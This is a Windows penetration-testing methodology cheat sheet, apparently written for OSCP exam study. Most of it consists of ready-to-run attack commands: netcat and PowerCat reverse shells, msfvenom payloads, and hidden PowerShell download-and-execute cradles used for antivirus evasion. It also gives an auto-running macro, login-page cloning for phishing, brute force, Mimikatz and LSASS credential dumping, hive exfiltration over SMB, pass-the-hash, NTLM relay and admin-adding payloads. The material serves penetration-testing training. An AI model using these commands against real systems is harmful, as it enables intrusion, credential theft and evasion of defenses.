# Windows Methodology

Part of [[METHODOLOGY CHEAT SHEET]]. Recon → SMB/LDAP enumeration → shells → privilege escalation, phase-ordered.

---

### Phase 1: Reconnaissance

#### Step 1: Port Scanning
```bash
nmap -v -sS -sV -Pn --top-ports 1000 -oA nmap_quick $BoxIP
nmap -sT -p- --min-rate 5000 --max-retries 1 -oA nmap_full $BoxIP
```

**What to look for**:
- SMB (139, 445) - file shares, SMB exploits
- RDP (3389) - remote desktop
- WinRM (5985, 5986) - remote management
- MSSQL (1433) - default credentials
- Web (80, 443, 8080)
- NetBIOS (137-139)

#### Step 1b: Vulnerability Scanning
> Full walkthrough (Nessus install/scan/analysis, Nmap NSE vuln scripts): [[07. Vulnerability Scanning|Vulnerability Scanning]]

```bash
sudo nmap -sV -p $Port --script "vuln" $BoxIP
```
*Same tooling and caveats as [[Linux Methodology#Step 1c: Vulnerability Scanning|Linux Methodology's Step 1c]], automated results need manual confirmation before you trust them, this matters even more on Windows targets where a flagged SMB CVE (EternalBlue, SMBGhost) can be genuinely destructive if exploited carelessly against a production-like box.*

#### Step 2: SMB Enumeration
```bash
enum4linux $BoxIP
smbclient -U guest -L //$BoxIP

# SMB vulnerability scan
nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 $BoxIP
```

**What to look for**:
- Shares (non-default names)
- Users (via enum4linux)
- Null sessions (SMB signing disabled)
- SMB vulnerabilities (EternalBlue, SMBGhost)

#### Step 3: Web Enumeration
> Full walkthrough (Nmap web fingerprinting, Wappalyzer, Gobuster incl. API pattern brute force, Burp Suite Proxy/Repeater/Intruder, XSS): [[08. Introduction to Web Application Attacks|Introduction to Web Application Attacks]], same techniques as [[Linux Methodology#Step 2: Web Application Enumeration|Linux Methodology's Step 2]], IIS/ASP.NET just changes the extensions and a couple of default paths.

```bash
nmap -p80 -sV $BoxIP
gobuster dir -u http://$BoxIP -w /usr/share/wordlists/dirb/common.txt -x aspx,asp,txt,config

# Proxy through Burp before manual testing, same setup as the Linux side
burpsuite   # Intercept off, browser proxy -> 127.0.0.1:8080, see [[Web Applications#Burp Suite|Command Appendix]]
```
**What to look for**: `web.config` (IIS config, sometimes leaks connection strings), `/aspnet_client/`, ViewState-based forms (`__VIEWSTATE`/`__EVENTVALIDATION` hidden fields have to ride along with every POST, scrape them fresh from the page each time).

#### Buff Pattern: Web Shell → Loopback Service → One-Port Tunnel → BOF

When the first shell is a low-privilege web process, immediately inspect local listeners and running processes. Buff is the reference route: Gym Management System 1.0 upload RCE gave a web shell, netstat exposed CloudMe only on loopback, Chisel made that one port reachable from Kali, and EDB-48389 supplied the x86 stack-overflow layout.

~~~bash
nmap -p $WebPort -sV $BoxIP
gobuster dir -u http://$BoxIP:$WebPort -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip
searchsploit "Gym Management System 1.0"
~~~

~~~cmd
netstat -ano
tasklist /v
~~~

→ If a service is listening only on 127.0.0.1, use [[RUNBOOK V2/Windows - Port Forwarding]] for the narrow reverse mapping, then [[RUNBOOK V2/Windows - Remote - CloudMe Buffer Overflow]] for the service exploit. Full worked example: [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]].

#### Step 4: LDAP/DNS Enumeration
```bash
# DNS zone transfer
host -l $Domain $BoxIP
nslookup
> server $BoxIP
> ls -d $Domain

# LDAP
ldapsearch -x -H ldap://$BoxIP -b "dc=domain,dc=com"
```

**No Kali tools available on target at all** (assumed-breach/LOLBAS scenario, e.g. handed a plain domain-joined workstation): every technique below uses only what ships on Windows by default.
```powershell
# DNS, against a specific server rather than relying on the client's own default resolver
nslookup mail.$Domain
nslookup -type=TXT info.$Domain <dns-server-ip>

# Port check (confirms open/closed, can't fingerprint a service version the way nmap does)
Test-NetConnection -Port 445 $BoxIP

# Quick-and-dirty full port sweep, no nmap needed at all
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("$BoxIP", $_)) "TCP port $_ is open"} 2>$null

# SMTP VRFY, Test-NetConnection can only confirm the port's open, need the Telnet client to actually talk to it
dism /online /Enable-Feature /FeatureName:TelnetClient
telnet $BoxIP 25
VRFY $Username
```
*Full explanation and worked examples for all four of these: [[06. Information Gathering#6.4.1. DNS Enumeration|6.4.1]] (nslookup), [[06. Information Gathering#6.4.3. Port Scanning with Nmap|6.4.3]] (the PowerShell port sweep, mechanics broken down in [[Reconnaissance & Enumeration (Breakdowns)#PowerShell TcpClient inline port sweep (no Nmap on target)|Command Breakdowns]]), [[06. Information Gathering#6.4.5. SMTP Enumeration|6.4.5]] (Telnet VRFY).*

---

### Phase 2: Initial Foothold

#### Step 1: Service Exploitation
```bash
# SMB exploits
searchsploit smb
# Try EternalBlue, SMBGhost, etc.

# Weak credentials
hydra -L users.txt -P rockyou.txt rdp://$BoxIP -t 1
hydra -L users.txt -P rockyou.txt smb://$BoxIP -t 4

# Web vulnerabilities
searchsploit <software> <version>
```

#### Step 1a: Fixing a Public Buffer Overflow Exploit
> Full walkthrough (theory, cross-compiling, return-address verification, offset bugs, SEH mechanics): [[14. Fixing Exploits|Fixing Exploits]]

```bash
# Exploit source includes winsock2.h/windows.h? Written to compile ON Windows, cross-compile from Kali instead
sudo apt install mingw-w64
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32   # -lws2_32 fixes undefined-reference-to-WSAStartup errors

# Run the compiled .exe directly from Kali, no Windows box needed
wine exploit.exe

# Fresh shellcode, avoid trusting an author's opaque hex blob
msfvenom -p windows/shell_reverse_tcp LHOST=$BoxIP LPORT=$Port EXITFUNC=thread \
  -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
**Before trusting the return address**: check the target's loaded modules in a debugger, a hardcoded address from a DLL not present on the target is dead on arrival. Reuse an address from another **EDB-verified** exploit against the same vuln when available, that's more reliable than guessing.

**Two debugging patterns worth recognizing:**
- EIP holds a rotated/shifted version of the expected value → offset miscalculation, not a wrong return address (check `strcpy`/`strcat` null-terminator handling)
- Target crashes/stops responding right after an exploit attempt with no listener running → likely the correct overwrite path, just an uncaught shell. Reset the VM, get the listener up **first**, retry

Full syntax: [[14. Fixing Exploits#Cross-Compiling with mingw-w64|Command Appendix]], [[Buffer Overflow & Memory Corruption#msfvenom: Generating Shellcode for a BOF Payload|Command Appendix]]. Troubleshooting: [[Fixing Exploits (Decision Tree)|Decision Tree]], [[Buffer Overflow & Memory Corruption (Decision Tree)|Decision Tree]].

#### Tags: #FixingExploits #BufferOverflow #MingwW64 #Wine #SEHOverflow

---

#### Step 1b: Client-Side Delivery (Macros / Library Files)

For internal-only targets with nothing exposed to attack directly, get a user to run something instead. See [[12. Client-Side Attacks#12.2. Exploiting Microsoft Office|12.2]] (Office macros) and [[12. Client-Side Attacks#12.3. Abusing Windows Library Files|12.3]] (Windows library files + `.lnk`).

**Office macro (VBA), scoped to the document itself, not Normal.dotm:**
```vba
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    CreateObject("Wscript.Shell").Run "<base64-encoded powershell -enc payload, chunked into <=255-char Str = Str + "..." lines>"
End Sub
```
Save as `.doc`/`.docm`, never `.docx` (won't persist the macro on save).

**Windows library file (`.Library-ms`), points Explorer at a WebDAV share:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType></templateInfo>
<searchConnectorDescriptionList><searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation><url>http://$LocalIP</url></simpleLocation>
</searchConnectorDescription></searchConnectorDescriptionList>
</libraryDescription>
```
Host the WebDAV share with `wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/`, drop a `.lnk` payload (PowerShell target, PowerCat cradle) inside it, deliver the library file separately (email or a writable share via `smbclient -c 'put'`).

See [[Client-Side Attacks (Decision Tree)|Decision Tree]] for troubleshooting both, [[Client-Side Attacks (Breakdowns)|Command Breakdowns]] for the library-file XML tag-by-tag meaning.

#### Tags: #ClientSideAttacks #WindowsLibraryFiles #WordMacros #WebDAV

---

#### Step 1c: Phishing (Credential Capture)
> Full walkthrough (pretext research, website cloning, clone-patching, credential capture): [[11. Phishing Basics|Phishing Basics]]

*The technique itself (clone a login page, patch the interactive bits, stand up a capture server, deliver via a researched pretext) is genuinely OS-agnostic, it targets the person, not their machine's OS, so it sits here as the initial-foothold-by-social-engineering counterpart to Step 1b's client-side delivery above rather than as a Windows-specific technique.*

```bash
# Clone (SingleFile CLI handles JS-rendered pages, wget alone can't)
single-file "https://$BoxIP" signin.html --browser-executable-path /usr/bin/chromium

# Patch with BeautifulSoup, not raw string-replace (quoting/attribute-order varies by capture tool)
# Credential capture server, listens on 0.0.0.0 not 127.0.0.1, redirects to the real site after capture
```
*Full syntax: [[Phishing#Cloning a Target Login Page|Command Appendix]]. Before delivering cross-machine, grep the clone for hardcoded `127.0.0.1` and replace with your actual routable IP, same "works on localhost, breaks for real" trap covered in [[Phishing (Breakdowns)#Why 127.0.0.1 breaks once a real victim machine is involved|Command Breakdowns]].*

See [[Phishing (Decision Tree)|Decision Tree]] for troubleshooting the clone/patch/delivery chain.

#### Tags: #Phishing #CredentialPhishing #WebsiteCloning #BeautifulSoup

---

#### Step 2: Shells & Payloads

**Netcat**:
```cmd
nc $LocalIP 4444 -e cmd.exe
```

**PowerShell**:
```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$LocalIP/powercat.ps1'); powercat -c $LocalIP -p 4444 -e powershell"
```

**MSFVenom**:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LocalIP LPORT=4444 -f exe -o shell.exe

# Meterpreter
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LocalIP LPORT=4444 -f exe -o met.exe
```

#### Step 2b: AV Evasion (When AV Is Blocking Direct Payloads)

> Full walkthrough (VirusTotal detection, in-memory PowerShell injection, Shellter PE injection, .bat wrappers, FTP delivery): [[15. Antivirus Evasion|Antivirus Evasion]]

When a raw `.exe` gets flagged, try these in order of least setup required:

**Option 1: PowerShell in-memory injection (no disk write, bypasses signature-based AV)**
```powershell
# Kali: serve the payload script
python3 -m http.server 80

# Victim runs this -- payload fetched and executed entirely in RAM, nothing written to disk
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://$LocalIP/payload.ps1')"
```
Flag-by-flag breakdown: [[Antivirus Evasion (Breakdowns)#The PowerShell AV-bypass flags|Command Breakdowns]].

**Option 2: Shellter PE injection (shellcode injected into a legitimate 32-bit PE)**
```bash
# Prereq (first time on Kali)
sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32:i386
rm -rf ~/.wine && WINEARCH=win32 wineboot    # reset Wine prefix to 32-bit

# Verify host PE is 32-bit before injecting
file target.exe    # must say PE32, not PE32+

# Run Shellter interactively
shellter
# → A (Auto), PE path, Stealth Mode Y, L (listed payloads), index 1 (Meterpreter [stager]) or 5 (shell [stager])
```
If the payload shows `[stager]` in the menu: use msfconsole `multi/handler` not nc. [[Shells & Payloads (Decision Tree)#Shellter payload menu shows stager|Decision Tree]]. Full commands: [[Shells & Payloads#Shellter PE Injection|Command Appendix]].

**Option 3: .bat wrapper (same in-memory IEX, delivered as a double-clickable file)**
```bat
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://$LocalIP/payload.ps1')"
```
Deliver via FTP, SMB share, or any writable path the victim can execute. FTP delivery syntax (active mode, explicit remote filename): [[Shells & Payloads#FTP Active-Mode Payload Delivery|Command Appendix]].

#### Tags: #AntivirusEvasion #Shellter #PowerShellInjection #BatWrapper #InMemory #PEInjection

---

#### Step 3: File Transfer
```powershell
# PowerShell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://$LocalIP/shell.exe', 'C:\temp\shell.exe')"

# Certutil
certutil.exe -urlcache -f http://$LocalIP/shell.exe C:\temp\shell.exe

# SMB
impacket-smbserver -smb2support share /var/www/html
copy \\$LocalIP\share\shell.exe shell.exe
```

---

### Phase 2.5: Password Attacks & Lateral Movement

> Full walkthrough (Hydra, Hashcat, Mimikatz, Responder, ntlmrelayx, Credential Guard bypass): [[16. Password Attacks|Password Attacks]]

#### Step 1: Service Brute Force / Spraying (before or without a shell)

```bash
# Dictionary attack against SSH
hydra -l $Username -P /usr/share/wordlists/rockyou.txt -s $Port ssh://$BoxIP

# Password spray against RDP (one password, many usernames -- avoids lockout)
hydra -L users.txt -p "$Password" rdp://$BoxIP

# HTTP POST form (get field names and failure string from Burp first)
hydra -l $Username -P /usr/share/wordlists/rockyou.txt $BoxIP \
  http-post-form "/$BoxDir:<field>=^PASS^:<failure-string>"

# HTTP basic auth
hydra -l $Username -P /usr/share/wordlists/rockyou.txt http-get://$BoxIP/

# Password spray or credential verification across a subnet (NetExec)
netexec smb $BoxIP -u $Username -p $Password
netexec smb $BoxIP -u $Username -p $Password --local-auth  # local account
```
Full command breakdown: [[Password Attacks (Breakdowns)#Hydra http-post-form: the three-field syntax|Command Breakdowns]]. Decision tree: [[Secrets & Credentials (Decision Tree)|Decision Tree]].

#### Tags: #Hydra #PasswordSpraying #BruteForce #NetExec

---

#### Step 2: Post-Exploitation Credential Extraction (local admin on target)

```powershell
# Launch Mimikatz from the target (or from a schtasks workaround -- see below)
.\mimikatz.exe
```

```
# Standard Mimikatz privilege chain
privilege::debug          # Enables SeDebugPrivilege (required for LSASS access)
token::elevate            # Impersonates SYSTEM token
lsadump::sam              # Dumps local NTLM hashes from SAM database

# For cached domain credentials (plain NTLM -- can be passed; wdigest if Credential Guard off)
sekurlsa::logonpasswords  # Reads from LSASS memory
```

> ⚠️ On Windows Server 2022: `token::elevate` gives a SYSTEM impersonation token but `lsadump::sam` still fails. Windows checks the PRIMARY process token (your user) not the impersonation token for SAM registry access. Fix: run Mimikatz via a scheduled task as an admin user so their token IS the primary token.

```cmd
# Schtask workaround when primary token blocks SAM access (FILES01/paul scenario)
schtasks /create /tn "HashDump" /tr "cmd /c C:\tools\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit > C:\tools\out.txt 2>&1" /sc once /st 00:00 /ru <machine>\$Username /rp "$Password" /f
schtasks /run /tn "HashDump"
type C:\tools\out.txt
```
Full breakdown: [[Password Attacks (Breakdowns)#Mimikatz privilege chain: why the three-step sequence|Command Breakdowns]].

```bash
# Crack NTLM hash on Kali (mode 1000, no salt, fast)
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
```

#### Tags: #Mimikatz #NTLM #SAM #LSASS #SeDebugPrivilege #Hashcat #Module16

---

#### Step 3: Pass-the-Hash (NTLM hash, no plaintext needed)

Raw NTLM hashes (from SAM or LSASS) can be passed directly without cracking. Net-NTLMv2 hashes CANNOT be passed -- only cracked or relayed.

```bash
# Interactive SYSTEM shell via PtH (psexec always gives SYSTEM)
impacket-psexec -hashes 00000000000000000000000000000000:$AdminHash Administrator@$BoxIP

# Shell as the authenticated user (wmiexec gives user context, no file drop)
impacket-wmiexec -hashes 00000000000000000000000000000000:$AdminHash Administrator@$BoxIP

# Access an SMB share with a hash (no shell, just file access)
smbclient \\\\$BoxIP\\$BoxName -U Administrator --pw-nt-hash $AdminHash
```

> LM hash portion is always 32 zeros on modern Windows (LM disabled). Format: `LMhash:NThash`.

> UAC remote restrictions apply: local admin accounts other than the actual `Administrator` (RID 500) can authenticate but won't get code execution via psexec. Domain accounts and the built-in Administrator are unaffected.

Decision tree for hash type: [[Secrets & Credentials (Decision Tree)#Got a hash from a Windows machine|Decision Tree]].

#### Tags: #PassTheHash #PtH #impacket #psexec #wmiexec #UAC #Module16

---

#### Step 4: Net-NTLMv2 Capture and Relay

When a Windows machine makes an outbound SMB connection to your Kali box, Responder intercepts the authentication and captures the Net-NTLMv2 hash.

```bash
# Terminal 1: start Responder on VPN interface
sudo responder -I tun0

# Terminal 2: from a foothold on the victim -- trigger SMB auth to Kali
dir \\$LocalIP\test    # "Access is denied" is expected -- Responder still captures the hash
```

```bash
# Crack Net-NTLMv2 hash offline (mode 5600)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force

# OR relay it live to a second target (when cracking fails or takes too long)
# Requirement: relayed user must have local admin on the relay target
impacket-ntlmrelayx --no-http-server -smb2support -t $BoxIP \
  -c "powershell -enc <UTF-16LE-base64-reverse-shell>"

# Generate the base64 payload (Python, UTF-16LE -- plain ASCII breaks -enc)
python3 -c "import base64; cmd='<reverse-shell-oneliner>'; print(base64.b64encode(cmd.encode('utf-16-le')).decode())"
```

Trigger the victim's SMB auth toward Kali with ntlmrelayx running (not Responder -- both can't own port 445 at the same time):
```cmd
dir \\$LocalIP\test
```

Full breakdown: [[Password Attacks (Breakdowns)#PowerShell -enc requires UTF-16LE base64, not plain ASCII|Command Breakdowns]].

**UNC filename injection variant:** if a web file upload handler uses Go's `filepath.Join(uploadDir, filename)` on Windows, a filename like `//kali-ip/share/file` is treated as an absolute UNC path. The server process authenticates to Kali when processing the upload -- captures the service account's Net-NTLMv2 hash without any victim action.

#### Tags: #NetNTLMv2 #Responder #NTLMRelay #ntlmrelayx #Hashcat #UNCInjection #Module16

---

#### Step 5: Credential Guard Bypass (memssp)

When Credential Guard is active, `sekurlsa::logonpasswords` shows encrypted `LSA Isolated Data` blobs instead of plaintext. memssp bypasses this by hooking SSPI before encryption.

```powershell
# Detect Credential Guard
Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
# Look for "CredentialGuard" in output
```

```
# Inside Mimikatz (requires local admin / SeDebugPrivilege)
privilege::debug
misc::memssp    # injects hook into LSASS, writes captured creds to C:\Windows\System32\mimilsa.log

# After a new user authenticates on this machine:
type C:\Windows\System32\mimilsa.log
# [session-id] DOMAIN\Username  plaintextpassword
```

> memssp only survives until reboot. It only captures NEW authentication events after injection -- pre-existing sessions are not logged. In a real engagement: inject, wait (or coerce a reconnect), return to read the log.

Full breakdown: [[Password Attacks (Breakdowns)#memssp: why SSPI-layer intercept beats Credential Guard|Command Breakdowns]].

#### Tags: #CredentialGuard #memssp #Mimikatz #SSPI #VBS #VTL #Module16

---

#### Step 6: Offline Credential Dump Alternatives (when Mimikatz is blocked or post-exfil)

**SAM offline dump** (no Mimikatz binary needed, uses built-in reg.exe):
```cmd
:: On target (admin cmd):
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
```
```bash
# Exfil via SMB server (Kali):
sudo impacket-smbserver -smb2support share /home/kali/loot
# On target: copy C:\Temp\SAM \\KALI_IP\share\SAM  (repeat for SYSTEM/SECURITY)

# Crack offline:
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

**LSASS minidump + pypykatz** (when Mimikatz AV-blocked, minidump exfiltrated):
```powershell
# On target: dump LSASS to a file (Task Manager → Details → lsass.exe → right-click → Create dump file)
# OR via comsvcs.dll:
rundll32 C:\Windows\System32\comsvcs.dll MiniDump <lsass-pid> C:\Temp\lsass.dmp full
```
```bash
# Parse on Kali — no Windows needed:
pypykatz lsa minidump lsass.dmp
# Output shows NTLM hashes + any wdigest plaintext
```

**NetExec remote dump** (one-liner with creds, no shell needed):
```bash
nxc smb $BoxIP -u Administrator -p $Password --sam     # local SAM hashes
nxc smb $BoxIP -u Administrator -p $Password --lsa     # LSA secrets
nxc smb $BoxIP -u Administrator -p $Password --ntds    # NTDS.dit (DC only)
```

**NTDS.dit via Volume Shadow Copy** (DC, no NTDS.dit file lock):
```cmd
vssadmin CREATE SHADOW /For=C:
:: Note the shadow path e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```
Then exfil + crack: `impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`

Full reference: [[16. Password Attacks|PA.8]], [[16. Password Attacks|PA.9]], [[16. Password Attacks|PA.13]].

#### Tags: #SAM #LSASS #pypykatz #NetExec #NTDS #VSS #OfflineDump #HTBSupplementary

---

#### Step 7: Credential Hunting on Windows

Check common plaintext credential locations before running heavy tools:

```powershell
# Saved RDP/network credentials
cmdkey /list

# Use saved credentials without knowing the password
runas /savecred /user:$Domain\$Username "cmd.exe /c whoami > C:\Temp\out.txt"

# PSReadLine history (current user)
Get-Content (Get-PSReadlineOption).HistorySavePath

# PowerShell transcript logs
Get-Content C:\Users\*\Documents\PowerShell_transcript*.txt

# Find credential strings in text files
findstr /SIM /C:"password" *.txt *.xml *.ini *.config *.bat

# All users' home dirs recursively (broader search)
Get-ChildItem C:\Users\ -Recurse -ErrorAction SilentlyContinue | Select-String "password" -ErrorAction SilentlyContinue
```

**LaZagne** (automated multi-app credential extraction):
```cmd
:: Extracts credentials from browsers, databases, mail clients, system stores etc.
.\lazagne.exe all        :: all modules
.\lazagne.exe browsers   :: browser passwords only
```

Full reference: [[16. Password Attacks|PA.11]], [[16. Password Attacks|PA.12]].

#### Tags: #CredentialHunting #cmdkey #LaZagne #findstr #PSReadLine #HTBSupplementary

---

### Phase 3: Privilege Escalation

> Full technique details + lab walkthroughs: [[17. Windows Privilege Escalation|Windows Privilege Escalation]]. Quick command lookup: [[Windows Privilege Escalation]]. "I found X, what do I try": [[Windows Privilege Escalation (Decision Tree)]].

#### Step 1: Situational Awareness
```cmd
whoami /all
whoami /priv
net user
net localgroup
net localgroup Administrators
systeminfo
hostname
ipconfig /all
route print
netstat -ano
tasklist /v
wmic qfe list
wmic product get name,version
wmic service get name,displayname,pathname,startmode
sc.exe query type= all state= all
```

#### Step 1.5: Sensitive Info Hunting (before tools)

PSReadLine command history (typed credentials end up here):
```powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content
```

Transcript files (recorded by Script Block Logging):
```powershell
Get-ChildItem C:\Users\*\Documents\PowerShell* -Recurse -ErrorAction SilentlyContinue
Get-ChildItem "C:\Windows\system32" -Filter "*transcript*" -ErrorAction SilentlyContinue
```

Search files for passwords:
```powershell
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.cfg,*.config,*.xml,*.log -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password","pass","secret" -ErrorAction SilentlyContinue
Get-ChildItem C:\Users\*\Desktop\*.txt -ErrorAction SilentlyContinue | Get-Content
Get-ChildItem "C:\Users\*\My Documents\*.txt" -ErrorAction SilentlyContinue | Get-Content
```

Saved credentials / AutoLogon:
```cmd
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query HKCU /f password /t REG_SZ /s
```

#### Step 2: Automated Enumeration
```powershell
# winPEAS -- full automated check, pipe to file for easy review
iwr -uri http://$LocalIP/winPEASx64.exe -OutFile winPEAS.exe
.\winPEAS.exe | Tee-Object -FilePath winpeas_out.txt

# PowerUp -- service/path/registry checks
IEX(New-Object Net.WebClient).DownloadString('http://$LocalIP/PowerUp.ps1')
Invoke-AllChecks

# Seatbelt -- deeper Windows specifics (DPAPI masterkeys, task details, app versions)
iwr -uri http://$LocalIP/Seatbelt.exe -OutFile Seatbelt.exe
.\Seatbelt.exe -group=all
```

> Defender quarantines known pre-compiled winPEAS EXE on sight. If it disappears after upload, the file size goes 0 -- Defender got it. Custom DLLs and non-signature-matched EXEs survive much better.

#### Step 3: Service Attack Vectors

PowerUp quick sweep:
```powershell
Get-ModifiableServiceFile   # service binary is writable
Get-UnquotedService         # unquoted path + writable intermediate directory
Get-ModifiableService       # service config (binPath) is writable
```

**Service Binary Hijacking** (you can write to the service EXE):
```powershell
icacls "C:\Path\to\service.exe"
# BUILTIN\Users:(F) or (W) or (M) = writable. Replace with adduser payload.
```
Adduser payload (compile on Kali):
```bash
x86_64-w64-mingw32-gcc -o payload.exe adduser.c -ladvapi32
```
```c
// adduser.c
#include <stdlib.h>
int main() {
    system("net user hacker Passw0rd! /add");
    system("net localgroup Administrators hacker /add");
    return 0;
}
```
Then: restart the service (or wait for auto-restart / reboot trigger).

**DLL Hijacking** (service loads a missing DLL from a user-writable directory):
```powershell
icacls "C:\Path\to\service\dir\"   # BUILTIN\Users has Write = go
# Check what the service loads: strings against the EXE, or Process Monitor NAME NOT FOUND results
```
Minimal DLL payload (cross-compile on Kali):
```bash
x86_64-w64-mingw32-gcc -shared -nostdlib -nostartfiles \
  -fno-stack-check -mno-stack-arg-probe \
  -Wl,--entry,DllMainCRTStartup \
  -o MissingDll.dll payload.c -lkernel32 -ladvapi32
```
The `-nostdlib -nostartfiles` strip CRT code Defender flags. `-fno-stack-check -mno-stack-arg-probe` prevent a linker error from missing `___chkstk_ms`. Trigger: service must restart to load the DLL.

**Unquoted Service Path** (path has a space, no quotes, intermediate dir is writable):
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"
icacls "C:\Program Files\Vuln App\"   # writable = plant payload at the first ambiguous component
# e.g. C:\Program Files\Vuln App\service.exe → plant C:\Program Files\Vuln.exe
sc start ServiceName
```

#### Step 4: Scheduled Task Attacks

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -notin @("SYSTEM","LOCAL SERVICE","NETWORK SERVICE","Users","Administrators")} | Select-Object TaskName,@{N="Binary";E={$_.Actions.Execute}},@{N="User";E={$_.Principal.UserId}}
schtasks /query /fo LIST /v | findstr /i "task\|run\|user\|next"
```

Three questions: (1) what user does it run as? (2) is the binary it calls writable? (3) how often does it run?

If the binary is writable: replace it with an adduser or reverse shell payload. Task fires on schedule. No service restart needed.

#### Step 5: Kernel Exploits

Check patch level:
```powershell
Get-CimInstance -Class win32_quickfixengineering | Where-Object {$_.Description -eq "Security Update"} | Sort-Object HotFixID
```

OSCP-era patches to verify:
- **KB5027215 absent** → CVE-2023-29360 (Microsoft Streaming Service Proxy EoP, spawns interactive SYSTEM process)
- **KB5025221/KB5025224 absent** → CVE-2023-28252 (CLFS driver UAF, in-process SYSTEM token swap)

Run the exploit. Key notes:
- Exploits spawning an interactive `cmd.exe` only give a usable shell under RDP, not WinRM or nc. Always pass `"cmd.exe /c <command>"` and write output to a file for non-interactive contexts.
- CVE-2023-28252 bkstephen PoC hardcodes `C:\Users\Public\` as working dir. If that path is denied in a WinRM session, try the exact same binary from a bind or reverse shell -- ACLs can differ between session types.

```powershell
.\clfs_eop.exe "cmd.exe /c whoami > C:\Services\out.txt"
type C:\Services\out.txt
```

#### Step 6: Special Privilege Paths

**SeImpersonatePrivilege** (common on IIS app pools, SERVICE accounts, after token theft):
```powershell
whoami /priv   # SeImpersonatePrivilege Enabled
iwr -uri http://$LocalIP/SigmaPotato.exe -OutFile SigmaPotato.exe
.\SigmaPotato.exe "net user hacker Passw0rd! /add"
.\SigmaPotato.exe "net localgroup Administrators hacker /add"
# Then evil-winrm as hacker
```

**SeBackupPrivilege** (Backup Operators group members):
```powershell
whoami /groups   # BUILTIN\Backup Operators
# Dump SAM and SYSTEM hives (readable with backup semantics, crackable offline):
reg save HKLM\SAM C:\Temp\sam.bak /y
reg save HKLM\SYSTEM C:\Temp\system.bak /y
# Or read any file directly via FILE_FLAG_BACKUP_SEMANTICS in a custom DLL/tool
```

**AlwaysInstallElevated** (MSI installs as SYSTEM regardless of user rights):
```powershell
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
# Both must be 1
```
```bash
msfvenom -p windows/adduser USER=hacker PASS=Passw0rd! -f msi -o shell.msi
```
```cmd
msiexec /quiet /qn /i C:\Users\Public\shell.msi
```

#### Tags: #WindowsPrivesc #PrivilegeEscalation #winPEAS #PowerUp #DLLHijack #ServiceBinaryHijacking #UnquotedServicePath #SeImpersonatePrivilege #SeBackupPrivilege #KernelExploit #CVE202328252 #CVE202329360 #ScheduledTasks #SigmaPotato #Module17 #Methodology
## Why this matters for OSCP

This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.

## Related Modules

- [[MODULES/17. Windows Privilege Escalation]] -- module concepts used by this hub page

## Demonstrated in box write-ups

- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- demonstrates the workflow described here
- [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]] -- demonstrates alternate-port web enumeration, loopback-service discovery, and service-specific BOF delivery
## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
